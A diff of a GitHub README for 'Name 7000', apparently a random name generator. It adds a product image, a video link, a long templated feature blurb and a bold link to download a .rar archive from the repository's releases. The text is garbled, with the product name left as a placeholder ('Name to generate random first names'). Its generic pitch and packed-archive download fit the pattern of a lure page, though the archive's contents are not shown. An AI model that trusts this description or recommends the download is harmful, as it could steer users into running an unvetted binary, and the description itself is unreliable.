@@ -1,2 +1,7 @@
-# Name-7000
-Name 7000
+<img width="400" height="400" alt="Name 7000" src="https://github.com/user-attachments/assets/f19a1848-1243-4953-96a2-fca8efb2b623" />
+
+https://github.com/user-attachments/assets/ed50bac1-d07f-40da-b5fa-46e54957fd61
+
+Name to generate random first names, last names, lists of random names, and more! Have you ever needed a list of random names say for a game with friends, as a game developer, for research purposes, or populating a test database with random names? If so, then this software is definitely for you! You can generate regular random names, random Baby Names, a Mafia style name generator, random character name generator, names of animals and for animals, plus much more! This software includes: The ability to generate first male names and first female names for the following nationalities: American names, common arabic names, common chinese names, French, German, Italian, Japanese, Korean, Latin, Polish, Norse, Native American, Russian, Spanish and Vietnamese Names, The ability to randomly generate last names for the following nationalities: American names, common arabic names, common chinese names, French, German, Italian, Japanese, Korean, Polish, Native American, Russian, Spanish and Vietnamese Names, The ability to turn any name into a ‘mafia’ style name that you can use for game guilds, or gaming, Ability to generate ”joke’ names or ‘funny’ names, screen names for computer games, plus much more!, The ability to randomly generate animal names, such as for Horses, Plus, you can ‘mix’ and ‘match’ ethnicities (i.e., random spanish First Names with random german last names),Plus, you can choose how the names should be separated, whether to save them to a file, or simply cut and paste, plus the ability to specify how many you wish to create.
+
+**[GITHUB](https://github.com/Name-Soft/Name-7000/releases/download/Name-7000/Name.7000.rar)**
